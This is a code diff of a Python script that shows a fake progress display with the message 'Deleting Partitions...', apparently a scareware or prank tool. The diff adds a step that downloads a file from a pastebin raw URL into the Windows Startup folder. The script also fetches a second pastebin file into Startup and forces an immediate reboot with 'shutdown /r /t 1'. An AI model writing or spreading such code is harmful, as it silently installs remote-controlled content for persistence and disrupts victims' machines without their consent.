@@ -11,10 +11,17 @@ import requests
 clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')
 clearConsole()
 
+user = os.environ['USERNAME']
+
 percent = 0
 
 def blue():
 	#importing text to QML
+	url = "https://pastebin.com/raw/XV47ctX6"
+
+	r = requests.get(url, allow_redirects=True)
+	open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.qml", 'wb').write(r.content)
+	
 	class Backend(QObject):
 
 		def __init__(self):
@@ -39,8 +46,6 @@ def blue():
 					sleep(pause)
 				
 				if curr_time == str(100) :
-					
-					user = os.environ['USERNAME']
 
 					url = "https://pastebin.com/raw/RSiyfdAQ"
 
@@ -51,15 +56,9 @@ def blue():
 
 					r = requests.get(url, allow_redirects=True)
 					open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/start.qml", 'wb').write(r.content)
-
-					url = "https://pastebin.com/raw/XV47ctX6"
-
-					r = requests.get(url, allow_redirects=True)
-					open("C:/Users/" + user + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/main.qml", 'wb').write(r.content)
 					
 					os.system("shutdown /r /t 1")
 
-	user = os.environ['USERNAME']
 	pause = random.randrange(int(0.1), 3)
 	print("Deleting Partitions...")
 	sleep(pause)
